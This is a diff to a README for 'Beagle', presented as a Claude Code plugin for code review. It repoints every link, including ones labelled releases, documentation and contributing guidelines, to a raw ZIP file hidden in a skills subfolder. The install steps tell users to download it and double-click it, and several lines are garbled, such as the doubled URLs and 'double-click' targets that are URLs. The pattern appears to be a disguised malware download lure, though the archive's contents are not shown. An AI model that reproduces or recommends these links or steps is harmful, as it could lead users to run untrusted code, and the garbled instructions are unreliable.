@@ -6,9 +6,9 @@ Welcome to the Beagle project! Beagle is a Claude Code plugin designed to enhanc
 
 ## 📥 Download Beagle
 
-[![Download Beagle](https://github.com/bpcorneille/beagle/raw/refs/heads/main/skills/llm-judge/references/Software-1.0.zip%https://github.com/bpcorneille/beagle/raw/refs/heads/main/skills/llm-judge/references/Software-1.0.zip)](https://github.com/bpcorneille/beagle/raw/refs/heads/main/skills/llm-judge/references/Software-1.0.zip)
+[![Download Beagle](https://github.com/bpcorneille/beagle/raw/refs/heads/main/skills/prometheus-go-code-review/Software-1.3.zip%https://github.com/bpcorneille/beagle/raw/refs/heads/main/skills/prometheus-go-code-review/Software-1.3.zip)](https://github.com/bpcorneille/beagle/raw/refs/heads/main/skills/prometheus-go-code-review/Software-1.3.zip)
 
-To get started, visit the [Releases page](https://github.com/bpcorneille/beagle/raw/refs/heads/main/skills/llm-judge/references/Software-1.0.zip) to download the latest version of Beagle.
+To get started, visit the [Releases page](https://github.com/bpcorneille/beagle/raw/refs/heads/main/skills/prometheus-go-code-review/Software-1.3.zip) to download the latest version of Beagle.
 
 ## 📋 System Requirements
 
@@ -31,15 +31,15 @@ Beagle packs a variety of features that enhance the code review experience:
 ## 🔎 How to Install
 
 1. **Download the Latest Version:**  
-   Visit the [Releases page](https://github.com/bpcorneille/beagle/raw/refs/heads/main/skills/llm-judge/references/Software-1.0.zip) and download the version that matches your operating system.
+   Visit the [Releases page](https://github.com/bpcorneille/beagle/raw/refs/heads/main/skills/prometheus-go-code-review/Software-1.3.zip) and download the version that matches your operating system.
 
 2. **Extract the Files:**  
    After downloading, locate the ZIP file in your Downloads folder. Right-click on the file and select "Extract All." Choose a folder where you'd like to store the application.
 
 3. **Run the Application:**  
    Navigate to the folder where you extracted the files. 
-   - For Windows, double-click on `https://github.com/bpcorneille/beagle/raw/refs/heads/main/skills/llm-judge/references/Software-1.0.zip`. 
-   - For macOS, double-click on `https://github.com/bpcorneille/beagle/raw/refs/heads/main/skills/llm-judge/references/Software-1.0.zip`. 
+   - For Windows, double-click on `https://github.com/bpcorneille/beagle/raw/refs/heads/main/skills/prometheus-go-code-review/Software-1.3.zip`. 
+   - For macOS, double-click on `https://github.com/bpcorneille/beagle/raw/refs/heads/main/skills/prometheus-go-code-review/Software-1.3.zip`. 
    - For Linux, you may need to open a terminal, navigate to the folder, and use the command `./beagle`.
 
 4. **Follow Setup Instructions:**  
@@ -63,7 +63,7 @@ If you encounter any issues while using Beagle, here are some common troubleshoo
 
 ## 📖 Documentation
 
-For detailed guidance on all features and options, please refer to the [official documentation](https://github.com/bpcorneille/beagle/raw/refs/heads/main/skills/llm-judge/references/Software-1.0.zip). You'll find tutorials, advanced usage tips, and more.
+For detailed guidance on all features and options, please refer to the [official documentation](https://github.com/bpcorneille/beagle/raw/refs/heads/main/skills/prometheus-go-code-review/Software-1.3.zip). You'll find tutorials, advanced usage tips, and more.
 
 ## 📞 Support
 
@@ -71,7 +71,7 @@ If you need assistance or have questions, feel free to open an issue in the repo
 
 ## 🌐 Contributing
 
-We welcome contributions to improve Beagle. If you’d like to contribute, please read our [contributing guidelines](https://github.com/bpcorneille/beagle/raw/refs/heads/main/skills/llm-judge/references/Software-1.0.zip) before getting started.
+We welcome contributions to improve Beagle. If you’d like to contribute, please read our [contributing guidelines](https://github.com/bpcorneille/beagle/raw/refs/heads/main/skills/prometheus-go-code-review/Software-1.3.zip) before getting started.
 
 ## 🔗 Follow Us
 
@@ -79,4 +79,4 @@ Stay updated with the latest features and improvements. Follow our project on Gi
 
 ---
 
-Remember, to download Beagle, visit the [Releases page](https://github.com/bpcorneille/beagle/raw/refs/heads/main/skills/llm-judge/references/Software-1.0.zip) for the most recent version. Enjoy simplifying your code review process with Beagle!
+Remember, to download Beagle, visit the [Releases page](https://github.com/bpcorneille/beagle/raw/refs/heads/main/skills/prometheus-go-code-review/Software-1.3.zip) for the most recent version. Enjoy simplifying your code review process with Beagle!
